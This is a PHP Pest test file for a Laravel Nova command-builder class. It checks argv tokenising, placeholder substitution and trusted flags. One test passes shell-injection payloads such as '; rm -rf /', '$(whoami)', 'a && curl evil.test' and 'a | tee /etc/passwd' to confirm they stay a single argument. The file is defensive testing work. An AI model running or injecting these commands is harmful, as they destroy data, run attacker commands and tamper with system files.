<?php

declare(strict_types=1);

use Farsi\NovaCommandCenter\Data\CommandDefinition;
use Farsi\NovaCommandCenter\Support\CommandBuilder;

function builder(): CommandBuilder
{
    return new CommandBuilder('/app', 'php');
}

function makeCommand(string $run, array $extra = []): CommandDefinition
{
    return CommandDefinition::fromConfig('Test', array_merge(['run' => $run], $extra));
}

it('prefixes artisan commands with the php binary and artisan path', function () {
    $built = builder()->build(makeCommand('cache:clear'), [], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'cache:clear']);
});

it('does not prefix bash commands', function () {
    $built = builder()->build(makeCommand('df -h', ['command_type' => 'bash']), [], []);

    expect($built->arguments)->toBe(['df', '-h']);
});

it('substitutes placeholders as a single discrete argument', function () {
    $built = builder()->build(makeCommand('cache:forget {key}'), ['key' => 'homepage'], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'cache:forget', 'homepage']);
});

it('keeps shell metacharacters inside a single argument (no injection)', function (string $payload) {
    $built = builder()->build(makeCommand('cache:forget {key}'), ['key' => $payload], []);

    // The payload must be exactly one argv element and nothing more was added.
    expect($built->arguments)->toBe(['php', '/app/artisan', 'cache:forget', $payload])
        ->and($built->arguments)->toHaveCount(4);
})->with([
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    'a && curl evil.test',
    'a | tee /etc/passwd',
    "a\nnewline",
    '--force',
    '> /tmp/x',
]);

it('appends a variable that is not referenced by a placeholder', function () {
    $built = builder()->build(makeCommand('cache:forget'), ['key' => 'homepage'], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'cache:forget', 'homepage']);
});

it('drops a token whose optional placeholder is empty', function () {
    $built = builder()->build(makeCommand('inspire --tag={tag}'), ['tag' => ''], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'inspire']);
});

it('substitutes an optional placeholder when provided', function () {
    $built = builder()->build(makeCommand('inspire --tag={tag}'), ['tag' => 'daily'], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'inspire', '--tag=daily']);
});

it('appends trusted flag tokens', function () {
    $built = builder()->build(makeCommand('migrate'), [], ['--force']);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'migrate', '--force']);
});

it('respects quotes when tokenising the run string', function () {
    $built = builder()->build(makeCommand("echo 'hello world'", ['command_type' => 'bash']), [], []);

    expect($built->arguments)->toBe(['echo', 'hello world']);
});

it('leaves unknown placeholders untouched', function () {
    $built = builder()->build(makeCommand('do:thing {known}'), [], []);

    expect($built->arguments)->toBe(['php', '/app/artisan', 'do:thing', '{known}']);
});
